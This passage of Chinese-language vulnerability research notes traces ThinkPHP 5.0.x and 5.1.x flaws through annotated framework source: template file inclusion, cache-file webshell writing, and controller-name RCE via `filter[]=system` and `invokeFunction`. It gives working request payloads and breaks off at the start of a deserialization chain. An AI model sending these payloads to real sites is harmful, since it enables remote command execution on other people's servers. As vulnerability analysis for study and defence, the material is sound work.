        // 模板不存在 抛出异常
        if (!is_file($template)) {
            throw new TemplateNotFoundException('template not exists:' . $template, $template);
        }
        // 记录视图信息
        App::$debug && Log::record('[ VIEW ] ' . $template . ' [ ' . var_export(array_keys($data), true) . ' ]', 'info');
        $this->template->fetch($template, $data, $config);#$data['cacheFile']="upload/a.jpg"
    }

#thinkphp/library/think/Template.php
    /**
     * 渲染模板文件
     * @access public
     * @param string    $template 模板文件
     * @param array     $vars 模板变量
     * @param array     $config 模板参数
     * @return void
     */
    public function fetch($template, $vars = [], $config = [])
    {
        if ($vars) {
            $this->data = $vars;
        }
        ...
        $template = $this->parseTemplateFile($template);
        if ($template) {
            $cacheFile = $this->config['cache_path'] . $this->config['cache_prefix'] . md5($this->config['layout_name'] . $template) . '.' . ltrim($this->config['cache_suffix'], '.');
            ...
            // 读取编译存储
            $this->storage->read($cacheFile, $this->data);#关键点
            #$this->data['cacheFile']="upload/a.jpg"
            // 获取并清空缓存
            $content = ob_get_clean();
            if (!empty($this->config['cache_id']) && $this->config['display_cache']) {
                // 缓存页面输出
                Cache::set($this->config['cache_id'], $content, $this->config['cache_time']);
            }
            echo $content;
        }
    }

#thinkphp/library/think/template/driver/File.php
    /**
     * 读取编译编译
     * @param string  $cacheFile 缓存的文件名
     * @param array   $vars 变量数组
     * @return void
     */
    public function read($cacheFile, $vars = [])
    {
        if (!empty($vars) && is_array($vars)) {
            // 模板阵列变量分解成为独立变量
            extract($vars, EXTR_OVERWRITE);
        }
        //载入模版缓存文件
        include $cacheFile;#完成文件包含
    }
```

用户输入没有被过滤通过`assign`方法保存到`$this->data`中,通过调用`fetch`方法加载模板输出,最终在`read`方法中进行文件包含

# 缓存getshell

[利用Thinkphp 5缓存漏洞实现前台Getshell](https://www.cnblogs.com/h2zZhou/p/7824723.html)

>测试版本为5.0.10

## 漏洞复现

>运行目录要修改到`/`而不是`/public`

```php
<?php
namespace app\index\controller;
use think\Cache;
class Index
{
    public function index()
    {
        $username=input("get.username");
        Cache::set("name",$username);
        return 'Cache success';
    }
}
```

`?username=asdf%0aphpinfo();//`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204132018118.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204132020702.png)

>跟thinkphpv3的缓存getshell类似

## 漏洞分析

函数调用栈

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204132032009.png)

```php
#thinkphp/library/think/Cache.php
    /**
     * 自动初始化缓存
     * @access public
     * @param array         $options  配置数组
     * @return Driver
     */
    public static function init(array $options = [])
    {
        if (is_null(self::$handler)) {
            // 自动初始化缓存
            if (!empty($options)) {
                $connect = self::connect($options);
            } elseif ('complex' == Config::get('cache.type')) {
                $connect = self::connect(Config::get('cache.default'));
            } else {
                $connect = self::connect(Config::get('cache'));
            }
/*
    // +----------------------------------------------------------------------
    // | 缓存设置
    // +----------------------------------------------------------------------

    'cache'                  => [
        // 驱动方式
        'type'   => 'File',
        // 缓存保存目录
        'path'   => CACHE_PATH,
        // 缓存前缀
        'prefix' => '',
        // 缓存有效期 0表示永久缓存
        'expire' => 0,
    ],
*/
            self::$handler = $connect;
        }
        return self::$handler;
    }
    /**
     * 写入缓存
     * @access public
     * @param string        $name 缓存标识
     * @param mixed         $value  存储数据
     * @param int|null      $expire  有效时间 0为永久
     * @return boolean
     */
    public static function set($name, $value, $expire = null)#$name="name",$vuale=用户输入值
    {
        self::$writeTimes++;
        return self::init()->set($name, $value, $expire);
    }

#thinkphp/library/think/cache/driver/File.php
    /**
     * 写入缓存
     * @access public
     * @param string    $name 缓存变量名
     * @param mixed     $value  存储数据
     * @param int       $expire  有效时间 0为永久
     * @return boolean
     */
    public function set($name, $value, $expire = null)#$name="name",$vuale=用户输入值
    {
        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }
        $filename = $this->getCacheKey($name);#生成文件名,$filename=b0/68931cc450442b63f5b3d276ea4297.php
        if ($this->tag && !is_file($filename)) {
            $first = true;
        }
        $data = serialize($value);#序列化数据,利用换行符逃逸,跟thinkphpv3一样
        if ($this->options['data_compress'] && function_exists('gzcompress')) {#数据压缩默认关闭
            //数据压缩
            $data = gzcompress($data, 3);
        }
        $data   = "<?php\n//" . sprintf('%012d', $expire) . $data . "\n?>";
        $result = file_put_contents($filename, $data);#写入文件
        if ($result) {
            isset($first) && $this->setTagItem($filename);
            clearstatcache();
            return true;
        } else {
            return false;
        }
    }
    /**
     * 取得变量的存储文件名
     * @access protected
     * @param string $name 缓存变量名
     * @return string
     */
    protected function getCacheKey($name)
    {
        $name = md5($name);#md5("name")=b068931cc450442b63f5b3d276ea4297
        if ($this->options['cache_subdir']) {
            // 使用子目录
            $name = substr($name, 0, 2) . DS . substr($name, 2);#$name=b0/68931cc450442b63f5b3d276ea4297
        }
        if ($this->options['prefix']) {
            $name = $this->options['prefix'] . DS . $name;
        }
        $filename = $this->options['path'] . $name . '.php';
        $dir      = dirname($filename);
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        return $filename;#b0/68931cc450442b63f5b3d276ea4297.php
    }
```

1. thinkphp推荐的运行目录是`/public`

2. 需要知道键名才能确定webshell的路径

3. 没有设置`$this->options['prefix']`

# RCE分析

>没有对控制器名进行合法性校验,导致在未开启强制路由的情况下,用户可以调用任意类的任意方法,最终导致远程代码执行漏洞的产生

[ThinkPHP5漏洞分析之代码执行9](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md)

[ThinkPHP5漏洞分析之代码执行10](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md)

## RCE方法1

### 5.1.x版本

5.1.0<=ThinkPHP<=5.1.30

`?s=index/\think\Request/input&filter[]=system&data=pwd`

```php
#/public/index.php
<?php
// [ 应用入口文件 ]
namespace think;

// 加载基础文件
require __DIR__ . '/../thinkphp/base.php';

// 支持事先使用静态方法设置Request对象和Config对象

// 执行应用并响应
Container::get('app')->run()->send();#进入App->run
```

```php
#thinkphp/library/think/App.php
    /**
     * 执行应用程序
     * @access public
     * @return Response
     * @throws Exception
     */
    public function run()
    {
        try {
            ...
            $dispatch = $this->dispatch;
            if (empty($dispatch)) {
                // 路由检测
                $dispatch = $this->routeCheck()->init();#进行路由检测
            }
            ...
        }
        ...

        $this->middleware->add(function (Request $request, $next) use ($dispatch, $data) {
            return is_null($data) ? $dispatch->run() : $data;#\think\route\Dispatch::run
        });

        $response = $this->middleware->dispatch($this->request);
        /*
         * 中间件调度
         * @access public
         * @param  Request  $request
         * @param  string   $type  中间件类型

        public function dispatch(Request $request, $type = 'route')
        {
            return call_user_func($this->resolve($type), $request);#通过这个call_user_func进入$dispatch->run()
        }
        */

        ...

        return $response;
    }
    
    /**
     * URL路由检测（根据PATH_INFO)
     * @access public
     * @return Dispatch
     */
    public function routeCheck()
    {
        ...
        // 获取应用调度信息
        $path = $this->request->path();#获取当前请求URL的pathinfo信息 $path=index/\think\Request/input
        ...
        // 路由检测 返回一个Dispatch对象
        $dispatch = $this->route->check($path, $must);#检测URL路由
        #$dispatch->dispatch = index|\think\Request|input
        ...
        return $dispatch;
    }

    /**
     * 检测URL路由
     * @access public
     * @param  string    $url URL地址
     * @param  bool      $must 是否强制路由
     * @return Dispatch
     * @throws RouteNotFoundException
     */
    public function check($url, $must = false)
    {
        // 自动检测域名路由
        $domain = $this->checkDomain();
        $url    = str_replace($this->config['pathinfo_depr'], '|', $url);#$url = index|\think\Request|input
        ...
        // 默认路由解析
        return new UrlDispatch($this->request, $this->group, $url, [
            'auto_search' => $this->autoSearchController,
        ]);
    }
```

```php
#thinkphp/library/think/route/dispatch/Url.php
class Url extends Dispatch
{
    public function init()
    {
        // 解析默认的URL规则
        $result = $this->parseUrl($this->dispatch);

        return (new Module($this->request, $this->rule, $result))->init();#\think\route\dispatch\Module::init
    }

    /**
     * 解析URL地址
     * @access protected
     * @param  string   $url URL
     * @return array
     */
    protected function parseUrl($url)
    {
        ...
        list($path, $var) = $this->rule->parseUrlPath($url);#\think\route\Rule::parseUrlPath 解析URL的pathinfo参数和变量
        /*
        $path = {数组} [3]
         0 = "index"
         1 = "\think\Request"
         2 = "input"
        */
        if (empty($path)) {
            return [null, null, null];
        }

        // 解析模块
        $module = $this->rule->getConfig('app_multi_module') ? array_shift($path) : null;
        if ($this->param['auto_search']) {
            ...
        } else {
            // 解析控制器
            $controller = !empty($path) ? array_shift($path) : null;
        }
        // 解析操作
        $action = !empty($path) ? array_shift($path) : null;
        /*
        $module = "index"
        $controller = "\think\Request"
        $action = "input"
        */
        ...
        // 封装路由
        $route = [$module, $controller, $action];
        ...
        return $route;
    }
}
```

```php
#thinkphp/library/think/route/Rule.php
    /**
     * 解析URL的pathinfo参数和变量
     * @access public
     * @param  string    $url URL地址
     * @return array
     */
    public function parseUrlPath($url)
    {
        // 分隔符替换 确保路由定义使用统一的分隔符
        $url = str_replace('|', '/', $url);#$url=index/\think\Request/input
        $url = trim($url, '/');
        $var = [];

        if (false !== strpos($url, '?')) {
            ...
        } elseif (strpos($url, '/')) {
            // [模块/控制器/操作]
            $path = explode('/', $url);
            /*
            $path = {数组} [3]
             0 = "index"
             1 = "\think\Request"
             2 = "input"
            */
        }
        ...

        return [$path, $var];
    }
```

```php
#thinkphp/library/think/route/dispatch/Module.php
    public function init()
    {
        ...

        $result = $this->dispatch;
        /*
        $result = {数组} [3]
         0 = "index"
         1 = "\think\Request"
         2 = "input"
        */

        if (is_string($result)) {
            $result = explode('/', $result);
        }

        if ($this->rule->getConfig('app_multi_module')) {
            // 多模块部署
            $module    = strip_tags(strtolower($result[0] ?: $this->rule->getConfig('default_module')));#获取模块名
            ...
        }
        ...
        $controller       = strip_tags($result[1] ?: $this->rule->getConfig('default_controller'));#获取控制器名
        $this->controller = $convert ? strtolower($controller) : $controller;
        $this->actionName = strip_tags($result[2] ?: $this->rule->getConfig('default_action'));#获取操作名

        // 设置当前请求的控制器、操作
        $this->request
            ->setController(Loader::parseName($this->controller, 1))
            ->setAction($this->actionName);

        return $this;
        /*
        $this = {think\route\dispatch\Module} [9]
         controller = "\think\request"
         actionName = "input"
        */
    }
```

```php
#thinkphp/library/think/route/Dispatch.php
    /**
     * 执行路由调度
     * @access public
     * @return mixed
     */
    public function run()
    {
        ...
        $data = $this->exec();
        return $this->autoResponse($data);
    }

    public function exec()
    {
        // 监听module_init
        $this->app['hook']->listen('module_init');

        try {
            // 实例化控制器
            $instance = $this->app->controller($this->controller,
                $this->rule->getConfig('url_controller_layer'),
                $this->rule->getConfig('controller_suffix'),
                $this->rule->getConfig('empty_controller'));
            #$instance = {think\Request} [39]
            ...
        } ...

        $this->app['middleware']->controller(function (Request $request, $next) use ($instance) {#再通过一次前面提到的中间件调度函数,进入这个匿名函数
            // 获取当前操作名
            $action = $this->actionName . $this->rule->getConfig('action_suffix');#$action = "input"

            if (is_callable([$instance, $action])) {
                // 执行操作方法
                $call = [$instance, $action];
                /*
                $call = {数组} [2]
                 0 = {think\Request} [39]
                 1 = "input"
                 */

                // 严格获取当前操作方法名
                $reflect    = new ReflectionMethod($instance, $action);
                $methodName = $reflect->getName();
                $suffix     = $this->rule->getConfig('action_suffix');
                $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;
                $this->request->setAction($actionName);

                // 自动获取请求变量
                $vars = $this->rule->getConfig('url_param_type')
                ? $this->request->route()
                : $this->request->param();
                $vars = array_merge($vars, $this->param);
            }
            ...
            $data = $this->app->invokeReflectMethod($instance, $reflect, $vars);#\think\Container::invokeReflectMethod
            #利用反射机制调用类中的方法,三个参数均由用户输入控制
            /*
            $instance = {think\Request} [39]
            $reflect = {ReflectionMethod} [2]
             name = "input"
             class = "think\Request"
            $vars = {数组} [2]
             filter = {数组} [1]
              0 = "system"
             data = "pwd"
            */
            return $this->autoResponse($data);
        });

        return $this->app['middleware']->dispatch($this->request, 'controller');
    }
```

```php
#thinkphp/library/think/Container.php
    /**
     * 调用反射执行类的方法 支持参数绑定
     * @access public
     * @param  object  $instance 对象实例
     * @param  mixed   $reflect 反射类
     * @param  array   $vars   参数
     * @return mixed
     */
    public function invokeReflectMethod($instance, $reflect, $vars = [])
    {
        $args = $this->bindParams($reflect, $vars);

        return $reflect->invokeArgs($instance, $args);
    }
```

```php
#thinkphp/library/think/Request.php
    /**
     * 获取变量 支持过滤和默认值
     * @access public
     * @param  array         $data 数据源
     * @param  string|false  $name 字段名
     * @param  mixed         $default 默认值
     * @param  string|array  $filter 过滤函数
     * @return mixed
     */
    public function input($data = [], $name = '', $default = null, $filter = '')
    {
        ...
        // 解析过滤器
        $filter = $this->getFilter($filter, $default);
        /*
        $filter = {数组} [2]
         0 = "system"
         1 = null
        */
        if (is_array($data)) {
            ...
        } else {
            $this->filterValue($data, $name, $filter);
        }
        ...
    }

    /**
     * 递归过滤给定的值
     * @access public
     * @param  mixed     $value 键值
     * @param  mixed     $key 键名
     * @param  array     $filters 过滤方法+默认值
     * @return mixed
     */
    private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);

        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);#达到RCE call_user_func(system, "pwd")
            
        ...
    }
```

漏洞产生的原因在于框架对控制器名没有进行检测,我们使用`?s=model/controller/action`传入路由

在`\think\App::run`中通过`$dispatch = $this->routeCheck()->init();`调用`\think\App::routeCheck`进行路由检测并得到`index|\think\Request|input`,然后进入`\think\route\dispatch\Url::init`,在其中有调用`parseUrl`方法进行路由解析

在`\think\route\dispatch\Url::parseUrl`中返回封装后的路由为

```php
$route = {数组} [3]
 0 = "index"
 1 = "\think\Request"
 2 = "input"
```

在`\think\route\dispatch\Url::init`的最后通过`return (new Module($this->request, $this->rule, $result))->init();`实例化了`Module`类并调用了其中的`init`方法

在`\think\route\dispatch\Module::init`中获取到了模块名,控制器名,操作名并将其设置为类的属性,最终`\think\App::run`中的`$dispatch`设置为`\think\route\dispatch\Module`类的对象并且其中包含模块名等属性

上述步骤中缺少对控制器名的检测

通过`$this->middleware->add(function (Request $request, $next) use ($dispatch, $data) {return is_null($data) ? $dispatch->run() : $data;});`和`\think\Middleware::dispatch`(中间件调度)中的`call_user_func`计入到`$dispatch->run()`中,即`\think\route\Dispatch::run`

在`\think\route\Dispatch::run`中通过`$data = $this->exec();`进入到`\think\route\dispatch\Module::exec`中

在`exec`方法中,通过`$this->app->invokeReflectMethod($instance, $reflect, $vars);`进入`\think\Container::invokeReflectMethod`中并通过调用反射执行类的方法`$reflect->invokeArgs($instance, $args)`成功进入到`\think\Request::input`中

而在`input`方法中对`filterValue`进行了调用,通过`filterValue`里面的`call_user_func`达到了RCE的目的

除了使用`?s=index/\think\Request/input&filter[]=system&data=pwd`外,还可以使用`?s=index/\think\Container/invokeFunction&function=call_user_func_array&vars[function_name]=system&vars[parameters][]=whoami`

利用`invokeFunction`中的`call_user_func_array`同样可以达到RCE的目的

```php
#thinkphp/library/think/Container.php
    /**
     * 执行函数或者闭包方法 支持参数调用
     * @access public
     * @param  mixed  $function 函数或者闭包
     * @param  array  $vars     参数
     * @return mixed
     */
    public function invokeFunction($function, $vars = [])
    {
        try {
            $reflect = new ReflectionFunction($function);

            $args = $this->bindParams($reflect, $vars);

            return call_user_func_array($function, $args);
        } catch (ReflectionException $e) {
            throw new Exception('function not exists: ' . $function . '()');
        }
    }

    /**
     * 绑定参数
     * @access protected
     * @param  \ReflectionMethod|\ReflectionFunction $reflect 反射类
     * @param  array                                 $vars    参数
     * @return array
     */
    protected function bindParams($reflect, $vars = [])
    {
        if ($reflect->getNumberOfParameters() == 0) {
            return [];
        }

        // 判断数组类型 数字数组时按顺序绑定参数
        reset($vars);
        $type   = key($vars) === 0 ? 1 : 0;
        $params = $reflect->getParameters();

        foreach ($params as $param) {
            $name      = $param->getName();
            $lowerName = Loader::parseName($name);
            $class     = $param->getClass();

            if ($class) {
                $args[] = $this->getObjectParam($class->getName(), $vars);
            } elseif (1 == $type && !empty($vars)) {
                $args[] = array_shift($vars);
            } elseif (0 == $type && isset($vars[$name])) {
                $args[] = $vars[$name];
            } elseif (0 == $type && isset($vars[$lowerName])) {
                $args[] = $vars[$lowerName];
            } elseif ($param->isDefaultValueAvailable()) {
                $args[] = $param->getDefaultValue();
            } else {
                throw new InvalidArgumentException('method param miss:' . $name);
            }
        }

        return $args;
    }
```

### 5.0.x版本

5.0.7<=ThinkPHP5<=5.0.22

>payload与5.1.x不太一样

虽然两个版本的`\think\Request::input`差不多,但是由于5.0.x版本的`\think\Request::__construct`是`protected`的,因此不能进行反射操作

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251237352.png)

可以使用`?s=index/\think\app/invokeFunction&function=call_user_func_array&vars[function_name]=system&vars[parameters][]=whoami`作为代替

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251255868.png)

```php
    /**
     * 执行函数或者闭包方法 支持参数调用
     * @access public
     * @param string|array|\Closure $function 函数或者闭包
     * @param array                 $vars     变量
     * @return mixed
     */
    public static function invokeFunction($function, $vars = [])
    {
        $reflect = new \ReflectionFunction($function);
        $args    = self::bindParams($reflect, $vars);
        // 记录执行信息
        self::$debug && Log::record('[ RUN ] ' . $reflect->__toString(), 'info');
        return $reflect->invokeArgs($args);
    }
```

## RCE方法2

5.0.0<=ThinkPHP5<=5.0.23

5.1.0<=ThinkPHP<=5.1.30

### 5.0.x版本

>测试版本为5.0.10

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251420354.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251516761.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251416169.png)

```
?s=captcha
POST _method=__construct&filter[]=system&method=get&get[]=pwd
```

或者直接POST传参`_method=__construct&filter[]=system&method=get&get[]=pwd`

#### 开启debug

```php
#thinkphp/start.php
<?php
namespace think;

// ThinkPHP 引导文件
// 加载基础文件
require __DIR__ . '/base.php';
// 执行应用
App::run()->send();#进入App->run
```

```php
#thinkphp/library/think/App.php
    /**
     * 执行应用程序
     * @access public
     * @param Request $request Request对象
     * @return Response
     * @throws Exception
     */
    public static function run(Request $request = null)
    {
        is_null($request) && $request = Request::instance();#调用\think\Request::__construct

        try {
            ...

            // 获取应用调度信息
            $dispatch = self::$dispatch;
            if (empty($dispatch)) {
                // 进行URL路由检测
                $dispatch = self::routeCheck($request, $config);#关键点1
                /*
                $dispatch = {数组} [3]
                 type = "method"
                 method = {数组} [2]
                  0 = "\think\captcha\CaptchaController"
                  1 = "index"
                 var = {数组} [0]
                */
            }
            // 记录当前调度信息
            $request->dispatch($dispatch);

            // 记录路由和请求信息
            if (self::$debug) {#当前debug处于开启状态
                Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
                Log::record('[ HEADER ] ' . var_export($request->header(), true), 'info');
                Log::record('[ PARAM ] ' . var_export($request->param(), true), 'info');#关键点2
            }
            ...
        } catch (HttpResponseException $exception) {
            $data = $exception->getResponse();
        }

        ...
    }
```

>关键点1

```php
    /**
     * URL路由检测（根据PATH_INFO)
     * @access public
     * @param  \think\Request $request
     * @param  array          $config
     * @return array
     * @throws \think\Exception
     */
    public static function routeCheck($request, array $config)
    {
        $path   = $request->path();
        $depr   = $config['pathinfo_depr'];
        $result = false;
        // 路由检测
        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config['url_route_on'];
        if ($check) {
            ...

            // 路由检测（根据路由定义返回不同的URL调度）
            $result = Route::check($request, $path, $depr, $config['url_domain_deploy']);
            $must   = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must'];
            if ($must && false === $result) {
                // 路由无效
                throw new RouteNotFoundException();
            }
        }
        if (false === $result) {
            // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索
            $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
        }
        return $result;
    }
```

```php
#thinkphp/library/think/Route.php
    /**
     * 检测URL路由
     * @access public
     * @param Request   $request Request请求对象
     * @param string    $url URL地址
     * @param string    $depr URL分隔符
     * @param bool      $checkDomain 是否检测域名规则
     * @return false|array
     */
    public static function check($request, $url, $depr = '/', $checkDomain = false)
    {
        ...
        $method = strtolower($request->method());
        ...
    }
```

```php
#thinkphp/library/think/Request.php
    /**
     * 当前的请求类型
     * @access public
     * @param bool $method  true 获取原始请求类型
     * @return string
     */
    public function method($method = false)
    {
        if (true === $method) {
            // 获取原始请求类型
            return IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
        } elseif (!$this->method) {
            if (isset($_POST[Config::get('var_method')])) {#Config::get('var_method') = _method
                $this->method = strtoupper($_POST[Config::get('var_method')]);#POST传参 _method=__construct
                $this->{$this->method}($_POST);#$this->__construct($_POST)
                #对该类的任意方法的调用,其传入对应的参数即对应的$_POST数组
            } elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) {
                $this->method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']);
            } else {
                $this->method = IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
            }
        }
        return $this->method;
    }

    /**
     * 构造函数
     * @access protected
     * @param array $options 参数
     */
    protected function __construct($options = [])
    {
        foreach ($options as $name => $item) {
            if (property_exists($this, $name)) {
                $this->$name = $item;
            }
        }
        if (is_null($this->filter)) {
            $this->filter = Config::get('default_filter');
        }

        // 保存 php://input
        $this->input = file_get_contents('php://input');
    }
```

>关键点2

```php
#thinkphp/library/think/Request.php
    /**
     * 获取当前请求的参数
     * @access public
     * @param string|array  $name 变量名
     * @param mixed         $default 默认值
     * @param string|array  $filter 过滤方法
     * @return mixed
     */
    public function param($name = '', $default = null, $filter = '')#$request->param() 因此 $name = ''
    {
        if (empty($this->param)) {
            $method = $this->method(true);
            // 自动获取请求变量
            switch ($method) {
                case 'POST':
                    $vars = $this->post(false);
                    /*
                    $vars = {数组} [4]
                     _method = "__construct"
                     filter = {数组} [1]
                      0 = "system"
                     method = "get"
                     get = {数组} [1]
                      0 = "pwd"
                    */
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this->put(false);
                    break;
                default:
                    $vars = [];
            }
            // 当前请求参数和URL地址中的参数合并
            $this->param = array_merge($this->get(false), $vars, $this->route(false));
        }
        ...
        return $this->input($this->param, $name, $default, $filter);#关键点 $name = ''
    }

    /**
     * 获取变量 支持过滤和默认值
     * @param array         $data 数据源
     * @param string|false  $name 字段名
     * @param mixed         $default 默认值
     * @param string|array  $filter 过滤函数
     * @return mixed
     */
    public function input($data = [], $name = '', $default = null, $filter = '')
    /*
    $data = {数组} [6]
     0 = "pwd"
     _method = "__construct"
     filter = {数组} [1]
      0 = "system"
     method = "get"
     get = {数组} [1]
      0 = "pwd"
     id = null
    */
    {
        if (false === $name) {#强类型比较 返回false,没有直接return
            // 获取原始数据
            return $data;
        }
        $name = (string) $name;
        if ('' != $name) {#$request->param() 因此 $name = '' 跳过
            ...
        }

        // 解析过滤器
        $filter = $this->getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);#对数组中的每个成员递归地应用用户函数,即调用$this->filterValue
            reset($data);
        } else {
            $this->filterValue($data, $name, $filter);
        }
        ...
    }

    /**
     * 递归过滤给定的值
     * @param mixed     $value 键值
     * @param mixed     $key 键名
     * @param array     $filters 过滤方法+默认值
     * @return mixed
     */
    private function filterValue(&$value, $key, $filters)
    {
    /*
    $filters = {数组} [1]
     0 = "system"
    $value = "pwd"
    */
        $default = array_pop($filters);
        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);#达到RCE目的
            } elseif (is_scalar($value)) {
                ...
            }
        }
        return $this->filterExp($value);
    }
```

进入`App::run`后由于开启了debug,因此可以通过`Log::record('[ PARAM ] ' . var_export($request->param(), true), 'info');`进入到`\think\Request::param`

在`\think\Request::param`中获取了当前请求的参数并通过`\think\Request::input`进行处理

在`\think\Request::input`中通过`array_walk_recursive($data, [$this, 'filterValue'], $filter);`调用`
\think\Request::filterValue`进行过滤,通过其中的`call_user_func`达到RCE目的

#### 关闭debug

```php
#thinkphp/library/think/App.php
    /**
     * 执行应用程序
     * @access public
     * @param Request $request Request对象
     * @return Response
     * @throws Exception
     */
    public static function run(Request $request = null)
    {
        is_null($request) && $request = Request::instance();

        try {
            ...

            // 获取应用调度信息
            $dispatch = self::$dispatch;
            if (empty($dispatch)) {
                // 进行URL路由检测
                $dispatch = self::routeCheck($request, $config);
            }
            // 记录当前调度信息
            $request->dispatch($dispatch);

            // 记录路由和请求信息
            if (self::$debug) {#debug已关闭
                Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
                Log::record('[ HEADER ] ' . var_export($request->header(), true), 'info');
                Log::record('[ PARAM ] ' . var_export($request->param(), true), 'info');
            }
            ...
            $data = self::exec($dispatch, $config);
            /*
            $dispatch = {数组} [2]
             type = "module"
            */
        } catch (HttpResponseException $exception) {
            $data = $exception->getResponse();
        }
        ...
    }

    protected static function exec($dispatch, $config)
    {
        switch ($dispatch['type']) {
            case 'redirect':
                ...
            case 'module':
                // 模块/控制器/操作
                $data = self::module($dispatch['module'], $config, isset($dispatch['convert']) ? $dispatch['convert'] : null);
                break;
        }
        return $data;
    }

    /**
     * 执行模块
     * @access public
     * @param array $result 模块/控制器/操作
     * @param array $config 配置参数
     * @param bool  $convert 是否自动转换控制器和操作名
     * @return mixed
     */
    public static function module($result, $config, $convert = null)
    {
        ...
        $request = Request::instance();
        ...
        // 当前模块路径
        App::$modulePath = APP_PATH . ($module ? $module . DS : '');#$module="index"

        // 是否自动转换控制器和操作名
        $convert = is_bool($convert) ? $convert : $config['url_convert'];
        // 获取控制器名
        $controller = strip_tags($result[1] ?: $config['default_controller']);
        $controller = $convert ? strtolower($controller) : $controller;#$controller="index"

        // 获取操作名
        $actionName = strip_tags($result[2] ?: $config['default_action']);
        $actionName = $convert ? strtolower($actionName) : $actionName;#$actionName="index"
        ...
        $instance = Loader::controller($controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller']);#$instance = {app\index\controller\Index} [0]
        // 获取当前操作名
        $action = $actionName . $config['action_suffix'];#$action = "index"

        $vars = [];
        if (is_callable([$instance, $action])) {
            // 执行操作方法
            $call = [$instance, $action];
        }
        ...
        return self::invokeMethod($call, $vars);#调用反射执行类的方法
    }

    /**
     * 调用反射执行类的方法 支持参数绑定
     * @access public
     * @param string|array $method 方法
     * @param array        $vars   变量
     * @return mixed
     */
    public static function invokeMethod($method, $vars = [])
    {
        ...
        $args = self::bindParams($reflect, $vars);#绑定参数
        /*
        $reflect = {ReflectionMethod} [2]
         name = "index"
         class = "app\index\controller\Index"
        $vars = {数组} [0]
        */
        ...
    }

    /**
     * 绑定参数
     * @access private
     * @param \ReflectionMethod|\ReflectionFunction $reflect 反射类
     * @param array                                 $vars    变量
     * @return array
     */
    private static function bindParams($reflect, $vars = [])
    {
        if (empty($vars)) {
            // 自动获取请求变量
            if (Config::get('url_param_type')) {
                $vars = Request::instance()->route();
            } else {
                $vars = Request::instance()->param();#进入到\think\Request::param,后续步骤与前面一样
            }
        }
        ...
    }
```

在调用反射执行类的方法时进行参数绑定,从而调用`\think\Request::param`,进而达到RCE的目的

### 5.1.x版本

5.1.0<=ThinkPHP<=5.1.30

>测试版本为5.1.6,同时开启debug

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251858287.png)

原理与5.0.x版本开启debug的情况一样,同样是由于开启debug后thinkphp记录调试信息,从而调用`\think\Request::param`,后面的触发方式跟前面的一样

```php
// 记录路由和请求信息
if ($this->debug) {
    $this->log('[ ROUTE ] ' . var_export($this->request->routeInfo(), true));
    $this->log('[ HEADER ] ' . var_export($this->request->header(), true));
    $this->log('[ PARAM ] ' . var_export($this->request->param(), true));
}
```

这个payload`_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al`无法复现...

```php
    /**
     * 获取当前请求的路由规则（包括子分组、资源路由）
     * @access protected
     * @param  string      $method
     * @return array
     */
    protected function getMethodRules($method)
    {
        return $this->rules[$method] + $this->rules['*'];#$this->rules[$method]不存在,因此报错
    }
```

```
$method = "__construct"
$this = {think\route\Domain} [12]
 rules = {数组} [8]
  * = {数组} [0]
  get = {数组} [2]
  post = {数组} [0]
  put = {数组} [0]
  patch = {数组} [0]
  delete = {数组} [0]
  head = {数组} [0]
  options = {数组} [0]
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251942366.png)

# 反序列化

## 5.0.x版本

5.0.24版本

>关闭short_open_tag

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204271314339.png)

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $s=input('post.s');
        $s=base64_decode($s);
        unserialize($s);
    }
}
```

1. 反序列化入口

`\think\process\pipes\Windows::__destruct`

```php
#thinkphp/library/think/process/pipes/Windows.php
    public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
    public function close()
    {
